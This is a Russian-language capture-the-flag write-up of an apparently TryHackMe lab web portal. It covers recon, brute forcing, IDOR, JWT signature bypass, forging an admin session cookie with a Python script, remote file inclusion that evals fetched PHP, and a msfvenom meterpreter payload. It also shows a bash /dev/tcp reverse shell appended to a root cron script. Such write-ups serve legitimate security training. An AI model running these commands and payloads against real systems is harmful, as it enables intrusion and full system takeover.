### ДЛЯ РЕШЕНИЯ НЕОБХОДИМО
- минимальное умение читать php/js, работать с python
- понимание принципа работы куки и токенов, эксплуатация token tampering
- умение брутфорсить, фаззить, работать с idor
- понимание rfi
### ВЗЯТИЕ ШЕЛЛА
по классике начинаем со скана портов. уже по ttl понятно, что вероятнее всего в стеке линукс (слава богу), что и подтвердил сканер. http методы, открытые порты, дефолтные прогнанные скрипты ничего интересного не дали

```
└─$ rustscan --ulimit 5000 --range 0-65535 -a 10.48.138.58 -- -sC -sV -oX results.xml

[~] The config file is expected to be at "/home/olya/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.48.138.58:22
Open 10.48.138.58:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.58 ((Ubuntu))
|_http-title: NexusCorp Portal
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.58 (Ubuntu)

```
идем на веб-сервер на 80ом порту. сразу включила бурп, чтобы была возможность отслеживать запросы. видим в url index.php - скорее всего стек lamp. окей. также нам сразу предлагают авторизоваться

<img width="1441" height="701" alt="image" src="https://github.com/user-attachments/assets/f9a39d87-c1a0-4627-9398-48c17c501419" />

пока осматриваемся на сайте, (код страницы, js файлы, краулим сразу доступные страницы). параллельно начинаем фаззинг
```
 ffuf -u http://10.48.138.58/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -e .php 
________________________________________________

.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 208ms] // сразу понимаеем, что стоит апаче
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 210ms]
admin                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 212ms]
api                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 259ms]
auth.php                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 212ms]
backup                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 215ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 201ms]
dashboard.php           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 207ms]
forgot.php              [Status: 200, Size: 684, Words: 67, Lines: 23, Duration: 200ms]
index.php               [Status: 200, Size: 861, Words: 98, Lines: 29, Duration: 198ms]
javascript              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 202ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 199ms]
reset.php               [Status: 200, Size: 410, Words: 32, Lines: 16, Duration: 201ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 207ms]
static                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 202ms]
support                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 204ms]
team.php                [Status: 200, Size: 3747, Words: 516, Lines: 97, Duration: 202ms]
```
пока идет фаззинг, подготавливаемся к проверке на sqli, так как там явно задан формат юзернейма, то вставляем один из возможных, который можно найти на странице team.php (в репиторе в бурпе)
```
username=robert.wilson&password=x
```
пользуемся sqlmap
```
sqlmap -r req1 \              
--batch \
--level 3 --risk 2 \
--random-agent \
--threads 5
```
запускаем скан. заранее скажу, что к sqli форма оказалась неуязвима. далее параллельно собрала все возможные юзернеймы с /team.php для брутфорса паролей (кстати, на сайте, на странице сброса паролей /forgot.php, есть энумерация пользователей, которая позволяет понять, что все упомянутые работники на странице /team.php зарегестрированы. также можно отправить запрос на сброс пароля на почту абсолютно любому пользователю. но больше ничего из этой функции выудить не смогла - ничего кроме юзернейма в пост-запросе не передается, никаких токенов и конструкций, с которыми можно было бы работать, нет)

<img width="397" height="392" alt="image" src="https://github.com/user-attachments/assets/569ca7f6-2809-496e-bb7c-eebe8e8ad880" />

собираем все юзернеймы с помощью cewl, оставляем только нужную часть через cut
```
cewl -d 2 -m 3 --lowercase --with-numbers -e --email_file emails.txt http://10.48.138.58/team.php
cut -d'@' -f1 emails.txt > usernames.txt
```
запускаем брутфорс (ффаф у меня работает быстрее гидры, так что через запускаю через него)
```
ffuf -request req2 -w /tmp/usernames:W1 -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt:W2 -ic -request-proto http -fs 918 
```
забегая вперед - брутфорс легко находит пароли от нескольких аккаунтов, поэтому просмотр директорий и выуживание из них инфы оказались слегка бесполезными, но для полноты картины опишу. параллельно я проверила результаты фаззинга. из интересного - поддиректории /static и /backup. в /static есть интересный файл app.js

```
// NexusCorp Portal - Frontend Utilities
// v2.3.1 - Build 20241115

(function() {
    'use strict';

    // Configuration (TODO: move to env before prod deployment - laura 2024-10-22)
    const CONFIG = {
        apiBase: '/api',
        // Encryption key for backup config decryption - AES-ECB-128
        // Key: N3xusK3y2024!!  (pad to 16 bytes with �)
        _backupKey: 'N3xusK3y2024!!',
        appVersion: '2.3.1'
    };

    // Session helper
    window.NexusApp = {
        getSession: function() {
            const cookie = document.cookie.split(';').find(c => c.trim().startsWith('nexus_session='));
            if (!cookie) return null;
            try {
                return JSON.parse(atob(cookie.split('=')[1].trim()));
            } catch(e) { return null; }
        },
        getApiToken: function() {
            return localStorage.getItem('nexus_jwt');
        },
        setApiToken: function(token) {
            localStorage.setItem('nexus_jwt', token);
        }
    };

    // Auto-fetch JWT if not cached
    if (!localStorage.getItem('nexus_jwt') && document.cookie.includes('nexus_session')) {
        fetch('/api/auth/token.php', {credentials: 'include'})
            .then(r => r.json())
            .then(d => { if (d.token) localStorage.setItem('nexus_jwt', d.token); })
            .catch(() => {});
    }
})();
```
здесь мы узнаем ключ для дешифровки, путь к апи эндпоинту, и также что, вероятно, для каких-то функций в приложении необходим jwt токен, который выдается при наличии кук, которые в свою очередь закодированы в base64. попыталась получить доступ к эндпоинту с кукой nexus_session, но ее валидность проверяется на бэкенде, так что попытка успехом не увенчалась. возможно, в куке закодированы какие-то стандартные значения, вроде id, role и тп, но решила оставить мучение с подбором куки на случай отсутствие других векторов (и слава богу). 

в /backup же лежит зашифрованный файл config.enc. так как в app.js оставлен ключ шифрования и его алгоритм, то воспользуемся ими для дешифровки (предварительно дополнив ключ до 16 байт нулевыми)

```
openssl enc -d -aes-128-ecb -in config.enc -out config.dec -K 4e337875734b33793230323421210000
cat config.dec
{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
```
полностью решив лабу, могу с уверенностью сказать, что это rabbit hole, потому что ничего полезного здесь не оказалось. единственное - теперь мы знаем, что существует системный юзер devops (попробовала подключиться по ssh, попробовав ключ шифрования в роли пароля, а также пробутфорсив пароли по словарю - не вышло)

возвращаемся к итогам брутфорса паролей на главной странице. бинго! мы получили доступ к аккаунтам аж нескольких пользователей (хотя никто из доступных и не является админом). на странице есть функция my profile api, на которой по адресу /api/users/profile.php?id=4 мы можем увидеть инфу о пользователях. увидев id=4, сразу попробовала проэксплуатировать idor. сработало, права доступа не проверяются. здесь мы и находим первый флаг. проверила наличие BOLA, отправив put-запрос - эндпоинт не уязвим

<img width="308" height="88" alt="image" src="https://github.com/user-attachments/assets/4b831d9b-b69c-449f-92ce-7faad74c97b7" />

сначала хотелось бы уточнить, что по содержанию второго флага поняла, что, судя по всему, есть более простой метод решения - через возможность отправлять тикеты и, собственно, получение админской куки через blind xss. ну, видимо, не в нашем случае. я же пошла через возможность чтения файлов. возвращаюсь к решению. 

сразу проверила куки через cyberchef, ведь из app.js помним, что они закодированы в base64 - возможен cookie tampering. но они оказались подписанными, так что попытка успехом не увенчалась. но на /dashboard.php видим, что сервер предоставляет возможность читать системные файлы. получаем токен по указанному эндпоинту

<img width="342" height="188" alt="image" src="https://github.com/user-attachments/assets/bfdd8a10-2c8e-4243-bc3c-960e08b7cb87" />

в запрос на /api/files.php к заголовкам в бурпе добавляем ```Authorization: Bearer eyJhbGciOiJIUzI1Ni...```, но получаем ```"error":"Admin JWT required. Check your token payload."```. на jwt.io декодируем токен, и видим, что в поле role выставлено user. можно изменить, но в заголовке указано, что используется алгоритм hs256, а он требует секретный ключ. для начала попробовала отправить токен в прнципе без подпси - с пустым третьим сегментом, и, на удивление, сработало. на бэкенде она не проверяется. поэтому спокойно меняем role на админ и получаем доступ к чтению файлов. с пустым параметром name сервер ответил:

 ```"usage":"\/api\/files.php?name=\/var\/www\/html\/filename.txt"}```

 сразу попробовала path traversal(/var/www/html/../../../etc/passwd и подобное) - не сработало. значит, пробуем прочитать файлы в /var/www/html. первым делом проверила index.php

 ```
<?php
require_once __DIR__ . '/config.php';

function get_session() {
    if (!isset($_COOKIE['nexus_session'])) return null;
    $raw = $_COOKIE['nexus_session'];
    $parts = explode('.', $raw, 2);
    if (count($parts) !== 2) return null;
    $expected_sig = hash_hmac('sha256', $parts[0], APP_SECRET);
    if (!hash_equals($expected_sig, $parts[1])) return null;
    $decoded = base64_decode($parts[0]);
    $data = json_decode($decoded, true);
    if (!$data || !isset($data['user_id'])) return null;
    $db = get_db();
    $stmt = $db->prepare('SELECT id, username, email, role FROM users WHERE id = ?');
    $stmt->execute([$data['user_id']]);
    return $stmt->fetch(PDO::FETCH_ASSOC);
}

function require_login() {
    $user = get_session();
    if (!$user) { header('Location: /index.php'); exit; }
    return $user;
}

function require_admin() {
    $user = require_login();
    if ($user['role'] !== 'admin') {
        http_response_code(403);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Forbidden']);
        exit;
    }
    return $user;
}

function generate_jwt($username) {
    $header = rtrim(base64_encode(json_encode(['alg'=>'HS256','typ'=>'JWT'])), '=');
    $payload = rtrim(base64_encode(json_encode([
        'sub' => $username,
        'role' => 'user',
        'iat' => time(),
        'exp' => time() + 3600
    ])), '=');
    $sig = rtrim(base64_encode(hash_hmac('sha256', "$header.$payload", JWT_SECRET, true)), '=');
    return "$header.$payload.$sig";
}

function verify_jwt($token) {
    $parts = explode('.', $token);
    if (count($parts) !== 3) return null;
    $payload = json_decode(base64_decode($parts[1]), true);
    if (!$payload) return null;
    if (isset($payload['exp']) && $payload['exp'] < time()) return null;
    return $payload;
}
?>
```
в коде сразу видим, что подпись действительно не проверяется. также находим очень и очень важную вещь - алгоритм создания кук. если узнаем app secret - сможжем создать админские, ведь из-за idor'а уже получили достаточно сведений об админе (его id). проверяем файл ```name=/var/www/html/config.php```, и действительно находим нужнею нам переменную (также там лежит пароль от дб, jwt_secret - на всякий случай запоминаем). теперь осталось сгенерировать собственную куку - для этого я написала скрипт на питоне
```
import base64
import hmac
import hashlib
import json

# Исходные параметры
app_secret = b"СЮДА_ВСТАВЛЯЕТСЯ_ЗНАЧЕНИЕ_APP_SECRET" # Секретный ключ сервера в байтах
user_data = {
    "user_id": 4
}

# Сериализация в JSON
json_str = json.dumps(user_data, separators=(',', ':'))

# Кодирование в Base64
payload = base64.b64encode(json_str.encode('utf-8')).decode('utf-8')

# Вычисление HMAC-SHA256 подписи
signature = hmac.new(
    app_secret, 
    payload.encode('utf-8'), 
    hashlib.sha256
).hexdigest()

# Сборка итоговой строки
cookie_value = f"{payload}.{signature}"

print("Сгенерированная кука:")
print(cookie_value)
```
теперь у нас есть админская кука! прикрепляем ее к запросу, получаем доступ к аккаунту лауры и забираем второй флаг.

далее последовало легкое разочарование - в админской панели я не нашла никаких новых функций. видимо, придется дальше биться с эндпоинтом /api/files.php. в первую очередь решила посмотреть наиболее полезные в данной ситуации файлы - логи, db.php, апи. и вот в файле ```/var/www/html/api/files.php``` нашла довольно интересную вешь.

```
if (strpos($name, "http://") === 0 || strpos($name, "https://") === 0) {
    $remote = @file_get_contents($name);
    if ($remote === false) {
        http_response_code(502);
        echo json_encode(["error" => "Could not fetch remote file"]);
        exit;
    }
    ob_start();
    eval(str_replace("<?php", "", $remote));
    $output = ob_get_clean();
    echo json_encode(["output" => $output]);
    exit;
}
```

по всей видимости, у нас здесь есть возможность эксплуатации rfi, притом, php код в файле должен исполняться сразу же. проверила, запустив http сервер - действительно пришло подключение. следующим шагом сгенерироуем пэйлоад через msfvenom

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f raw -o shell.php
```

настраиваем exploit/multi/handler в msfconsole и подгружаем нужный нам файл через питоновский сервер (в name указываем http://ip/shell.php)

```
python3 -m http.server 80
```

и ловим соединение за www-data! третий флаг взят

### Взятие рута

немного огляделась в системе, апгрейднула шелл до pty, подгрузила в /tmp linpeas.sh и pspy64 (также через питоновский сервер). пока линпис сканировал - попробовала подключиться к юзеру devops c найденными от дб кредами. и это, на удивление, сработало (к счастью или к сожалению, потому что это еще один момент, который мог бы упростить жизнь очень сильно ранее). четвертый флаг взят!
теперь мы имеем права юзера devops. опять же, пока линпис сканировал, запустила pspy64, и заметила, что от рута периодически запускается необычный процесс, видимо, какой-то кронтаб
```
2026/06/30 22:39:01 CMD: UID=0     PID=7702   | /bin/bash /opt/monitoring/health_report.sh
```
проверила - у группы devops есть право на запись в файл. линпис в итоге так и не понадобился. записала туда простенький реверсшелл, открыла у себя соединение через ```rlwrap nc -lvnp 5555```
```
devops@tryhackme-2404:/opt/monitoring$ echo 'bash -c "bash -i >& /dev/tcp/192.168.156.81/5555 0>&1"' >> health_report.sh 
devops@tryhackme-2404:/opt/monitoring$ cat health_report.sh 
#!/bin/bash
# NexusCorp Health Monitoring Script
LOG_FILE="/var/log/nexus_health.log"
TIMESTAMP=$(date "+%Y-%m-%d %H:%M:%S")
echo "[$TIMESTAMP] Health check started" >> "$LOG_FILE"
systemctl is-active --quiet apache2 && echo "[$TIMESTAMP] Apache: OK" >> "$LOG_FILE" || echo "[$TIMESTAMP] Apache: DOWN" >> "$LOG_FILE"
systemctl is-active --quiet mysql && echo "[$TIMESTAMP] MySQL: OK" >> "$LOG_FILE" || echo "[$TIMESTAMP] MySQL: DOWN" >> "$LOG_FILE"
DISK=$(df -h / | awk "NR==2{print \$5}")
echo "[$TIMESTAMP] Disk: $DISK" >> "$LOG_FILE"
bash -c "bash -i >& /dev/tcp/ip/5555 0>&1"
```
ждем исполнения скрипта и ловим подключение за рута, читаем последний флаг

<img width="678" height="166" alt="image" src="https://github.com/user-attachments/assets/c1c6f69f-2c62-4ec4-9517-a9deb8935884" />

все флаги взяты!
p.s. старалась расписывать свой ход мыслей максимально подробно, не пропуская в том числе те шаги, которые в итоге оказались бесполезными. надеюсь, что вышло не слишком спонтанно
